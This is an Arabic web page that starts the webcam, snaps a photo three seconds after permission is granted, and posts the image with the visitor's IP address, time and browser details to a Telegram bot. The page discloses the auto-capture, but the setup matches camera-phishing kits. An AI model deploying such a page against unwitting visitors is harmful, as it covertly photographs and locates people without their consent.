<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>كاميرا - التقاط تلقائي</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: Arial, sans-serif;
            background: #0d0d1a;
            color: #fff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 500px;
            width: 100%;
            background: rgba(255, 255, 255, 0.06);
            backdrop-filter: blur(12px);
            padding: 30px 20px;
            border-radius: 32px;
            border: 1px solid rgba(255, 255, 255, 0.08);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
            text-align: center;
        }
        h2 {
            font-size: 26px;
            margin-bottom: 8px;
        }
        .sub {
            color: #aaa;
            font-size: 14px;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 14px 18px;
            margin: 6px 0;
            border-radius: 40px;
            border: 1px solid #333;
            background: #1a1a2e;
            color: #fff;
            font-size: 15px;
            outline: none;
            transition: 0.3s;
        }
        input:focus {
            border-color: #4facfe;
            background: #222;
        }
        input::placeholder {
            color: #666;
        }
        #video {
            width: 100%;
            max-width: 400px;
            border-radius: 20px;
            border: 2px solid #4facfe;
            margin: 15px auto;
            display: block;
            background: #000;
            aspect-ratio: 4/3;
            object-fit: cover;
        }
        .status-box {
            margin: 12px 0;
            padding: 10px;
            border-radius: 40px;
            font-weight: bold;
            font-size: 15px;
            background: #1a1a2e;
            border: 1px solid #333;
        }
        .status-box .badge {
            display: inline-block;
            padding: 4px 16px;
            border-radius: 30px;
            font-size: 13px;
            background: #eab308;
            color: #000;
        }
        .badge.ready {
            background: #22c55e;
        }
        .badge.error {
            background: #ef4444;
            color: #fff;
        }
        .btn-group {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            justify-content: center;
            margin: 15px 0;
        }
        button {
            padding: 14px 28px;
            border: none;
            border-radius: 50px;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            transition: 0.2s;
            background: #4facfe;
            color: #000;
            flex: 1 1 auto;
            min-width: 120px;
        }
        button:hover {
            transform: scale(1.04);
            background: #00d4ff;
        }
        button.secondary {
            background: #555;
            color: #fff;
        }
        button.secondary:hover {
            background: #777;
        }
        button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none !important;
        }
        #log {
            background: #12121f;
            padding: 14px;
            border-radius: 16px;
            margin-top: 18px;
            font-size: 14px;
            text-align: left;
            min-height: 60px;
            border: 1px solid #2a2a3a;
            white-space: pre-wrap;
            word-break: break-all;
            color: #ccc;
            line-height: 1.6;
        }
        .highlight {
            color: #facc15;
        }
        .btn-allow {
            background: #22c55e;
            color: #000;
            padding: 16px 30px;
            font-size: 18px;
            margin: 10px 0;
        }
        .btn-allow:hover {
            background: #4ade80;
        }
        .small {
            font-size: 12px;
            color: #777;
            margin-top: 10px;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>📸 التقاط تلقائي فوري</h2>
    <p class="sub">بعد السماح للكاميرا، سيتم الالتقاط تلقائياً بعد 3 ثوانٍ</p>

    <input type="text" id="botToken" placeholder="توكن البوت">
    <input type="text" id="chatId" placeholder="معرف المحادثة (Chat ID)">

    <div class="status-box">
        <span id="statusBadge" class="badge">⏳ في انتظار الكاميرا</span>
    </div>

    <video id="video" autoplay muted playsinline></video>

    <div class="btn-group">
        <button id="captureNowBtn">📷 التقط الآن</button>
        <button class="secondary" id="restartBtn">🔄 إعادة تشغيل</button>
    </div>

    <button id="requestPermissionBtn" class="btn-allow">🔓 طلب إذن الكاميرا</button>

    <div id="log">📌 اضغط على "طلب إذن الكاميرا" للبدء</div>
    <p class="small">إذا ظهر طلب الإذن، اختر "السماح"</p>
</div>

<script>
    (function() {
        'use strict';

        const video = document.getElementById('video');
        const logDiv = document.getElementById('log');
        const statusBadge = document.getElementById('statusBadge');
        const botTokenInput = document.getElementById('botToken');
        const chatIdInput = document.getElementById('chatId');
        const captureNowBtn = document.getElementById('captureNowBtn');
        const restartBtn = document.getElementById('restartBtn');
        const requestBtn = document.getElementById('requestPermissionBtn');

        let stream = null;
        let cameraReady = false;
        let captureInProgress = false;
        let autoCaptureTimer = null;

        // ===== السجل والحالة =====
        function log(msg, type = 'info') {
            const time = new Date().toLocaleTimeString();
            const emoji = type === 'error' ? '❌' : type === 'success' ? '✅' : '📌';
            logDiv.innerHTML = `${emoji} [${time}] ${msg}`;
            console.log(`[${time}] ${msg}`);
        }

        function setStatus(text, state = 'waiting') {
            statusBadge.textContent = text;
            statusBadge.className = 'badge';
            if (state === 'ready') statusBadge.classList.add('ready');
            else if (state === 'error') statusBadge.classList.add('error');
        }

        // ===== تحميل / حفظ الإعدادات =====
        function loadConfig() {
            try {
                const t = localStorage.getItem('telegram_bot_token');
                const c = localStorage.getItem('telegram_chat_id');
                if (t) botTokenInput.value = t;
                if (c) chatIdInput.value = c;
            } catch (e) {}
        }
        function saveConfig() {
            const t = botTokenInput.value.trim();
            const c = chatIdInput.value.trim();
            if (t && c) {
                localStorage.setItem('telegram_bot_token', t);
                localStorage.setItem('telegram_chat_id', c);
                log('✅ تم حفظ الإعدادات', 'success');
                return true;
            } else {
                log('⚠️ الرجاء إدخال Token و Chat ID', 'error');
                return false;
            }
        }

        // ===== تشغيل الكاميرا =====
        async function startCamera() {
            try {
                setStatus('⏳ طلب إذن الكاميرا...', 'waiting');
                log('📷 جاري طلب الوصول للكاميرا...', 'info');

                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                    audio: false
                });

                video.srcObject = stream;
                await video.play();
                cameraReady = true;
                setStatus('✅ الكاميرا جاهزة', 'ready');
                log('✅ الكاميرا تعمل الآن', 'success');

                // الالتقاط التلقائي بعد 3 ثوانٍ
                if (autoCaptureTimer) clearTimeout(autoCaptureTimer);
                log('⏳ سيتم الالتقاط تلقائياً بعد 3 ثوانٍ...', 'info');
                autoCaptureTimer = setTimeout(() => {
                    if (cameraReady) {
                        log('🔄 بدء الالتقاط التلقائي...', 'info');
                        captureAndSend();
                    }
                }, 3000);

            } catch (error) {
                let msg = '';
                if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
                    msg = '🚫 تم رفض الإذن. اضغط على زر "طلب إذن الكاميرا" مرة أخرى، واختر "السماح".';
                    setStatus('⚠️ مرفوض', 'error');
                } else if (error.name === 'NotFoundError') {
                    msg = '🔍 لا توجد كاميرا متصلة.';
                    setStatus('⚠️ لا كاميرا', 'error');
                } else {
                    msg = '❌ ' + error.message;
                    setStatus('⚠️ خطأ', 'error');
                }
                log(msg, 'error');
                cameraReady = false;
            }
        }

        // ===== إيقاف الكاميرا =====
        function stopCamera() {
            if (stream) {
                stream.getTracks().forEach(t => t.stop());
                stream = null;
            }
            video.srcObject = null;
            cameraReady = false;
            if (autoCaptureTimer) clearTimeout(autoCaptureTimer);
            setStatus('⏹️ متوقفة', 'waiting');
            log('⏹️ الكاميرا متوقفة', 'info');
        }

        // ===== IP =====
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip || 'غير معروف';
            } catch { return 'غير معروف'; }
        }

        // ===== الالتقاط والإرسال =====
        async function captureAndSend() {
            if (captureInProgress) {
                log('⏳ جاري الالتقاط بالفعل، انتظر', 'info');
                return;
            }
            if (!cameraReady) {
                log('⚠️ الكاميرا غير جاهزة بعد', 'error');
                return;
            }

            const token = botTokenInput.value.trim();
            const chatId = chatIdInput.value.trim();
            if (!token || !chatId) {
                log('⚠️ أدخل Token و Chat ID أولاً', 'error');
                return;
            }
            localStorage.setItem('telegram_bot_token', token);
            localStorage.setItem('telegram_chat_id', chatId);

            captureInProgress = true;
            captureNowBtn.disabled = true;
            setStatus('📸 جاري الالتقاط...', 'waiting');
            log('📸 التقاط الصورة...', 'info');

            try {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.92));
                if (!blob) throw new Error('فشل تحويل الصورة');

                const ip = await getIP();
                const now = new Date().toLocaleString('ar-EG', {
                    year: 'numeric', month: 'long', day: 'numeric',
                    hour: '2-digit', minute: '2-digit', second: '2-digit'
                });
                const caption =
                    `📸 *صورة ملتقطة تلقائياً*%0A` +
                    `🕒 *التوقيت:* ${now}%0A` +
                    `🌐 *IP:* ${ip}%0A` +
                    `📱 *المتصفح:* ${navigator.userAgent.substring(0, 70)}...`;

                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'snapshot.jpg');
                formData.append('caption', caption);
                formData.append('parse_mode', 'Markdown');

                log('📤 جاري الإرسال إلى تليجرام...', 'info');
                const response = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                const result = await response.json();

                if (result.ok) {
                    log('✅ تم إرسال الصورة بنجاح!', 'success');
                    setStatus('✅ تم الإرسال', 'ready');
                } else {
                    const err = result.description || 'خطأ غير معروف';
                    log(`❌ فشل الإرسال: ${err}`, 'error');
                    setStatus('❌ فشل الإرسال', 'error');
                }

            } catch (error) {
                log(`❌ خطأ أثناء الالتقاط: ${error.message}`, 'error');
                setStatus('⚠️ خطأ', 'error');
            } finally {
                captureInProgress = false;
                captureNowBtn.disabled = false;
            }
        }

        // ===== إعادة التشغيل =====
        function restart() {
            stopCamera();
            setTimeout(startCamera, 300);
        }

        // ===== أحداث الأزرار =====
        captureNowBtn.addEventListener('click', () => {
            if (saveConfig()) captureAndSend();
        });
        restartBtn.addEventListener('click', restart);
        requestBtn.addEventListener('click', () => {
            log('🔓 طلب إذن الكاميرا...', 'info');
            startCamera();
        });

        // ===== تحميل الإعدادات والبدء =====
        loadConfig();

        // ===== لا نبدأ تلقائياً، بل ننتظر ضغط المستخدم على زر الطلب =====
        log('👆 اضغط على زر "طلب إذن الكاميرا" للبدء', 'info');
        setStatus('⏳ اضغط للطلب', 'waiting');

        // ===== عند العودة للصفحة =====
        document.addEventListener('visibilitychange', () => {
            if (!document.hidden && !cameraReady) {
                // يمكن إعادة المحاولة تلقائياً إذا كان المستخدم قد سمح سابقاً
                // لكن نفضل أن يضغط المستخدم يدوياً
            }
        });

    })();
</script>

</body>
</html>
